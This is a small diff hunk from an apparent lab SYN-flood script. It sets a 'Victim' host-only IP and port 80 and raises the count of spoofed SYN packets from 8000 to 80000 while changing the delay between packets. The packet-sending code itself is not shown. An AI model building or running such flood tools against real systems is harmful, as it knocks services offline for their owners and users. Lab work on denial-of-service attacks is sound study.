@@ -6,8 +6,8 @@ import time
 
 TARGET_IP = "192.168.56.103"   # ✅ Victim's Host-only IP
 TARGET_PORT = 80
-PACKET_COUNT = 8000
-DELAY = 0.0001  # delay between packets (optional throttle)
+PACKET_COUNT = 80000
+DELAY = 0.001  # delay between packets (optional throttle)
 
 print(f"Sending {PACKET_COUNT} spoofed SYN packets to {TARGET_IP}:{TARGET_PORT}")
 
